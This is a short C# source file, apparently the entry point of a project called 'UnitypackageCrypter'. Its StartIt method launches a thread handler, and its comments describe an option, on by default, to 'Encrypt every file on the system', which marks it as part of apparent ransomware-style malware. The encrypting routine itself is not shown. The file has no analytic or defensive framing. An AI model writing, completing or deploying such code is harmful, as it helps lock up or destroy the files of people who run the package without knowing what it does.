using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using UnitypackageCrypter.ThreadHandler;

namespace UnitypackageCrypter
{
   
    public class EntryPoint
    {
        /// <summary>
        /// Run this to start the Crypting.
        /// </summary>
        /// <param name="saveStart">Set it to true to run the DLL</param>
        /// <param name="path">Choose a Specific Path, NOT IMPLEMENTED</param>
        /// <param name="all">Encrypt every file on the system</param>
        public static void StartIt(bool saveStart, string path = "null", bool all = true)
        {
            if (saveStart)
            {
                ThreadHandler.ThreadHandler.StartHandling();
            }
        }
    }
}
